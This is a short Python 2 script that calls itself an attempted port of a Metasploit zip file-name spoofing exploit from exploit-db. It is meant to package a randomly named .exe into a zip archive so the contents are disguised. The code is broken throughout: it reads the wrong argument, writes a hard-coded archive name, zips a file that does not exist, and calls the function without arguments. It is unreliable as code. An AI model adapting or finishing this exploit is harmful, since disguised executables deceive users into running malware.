import sys
import random
import zipfile

"""
My poor attempt @ porting a msf exploit to python. - http://www.exploit-db.com/exploits/32752/

Run with:
    python spoof.py file_to_spoof new_spoofed_filename
"""
file = sys.argv[0]
newfile = sys.argv[1]

def spoof_file(file, newfile):
    new_filename = ''.join(random.choice('0123456789abcdefghijklmnopqurstuvwxyz') for i in range(16)) + ".exe"
    zip = zipfile.ZipFile('new_filename', 'w')
    zip.write(new_filename)
    zip.close()
    print "Created file: " + new_filename

spoof_file()
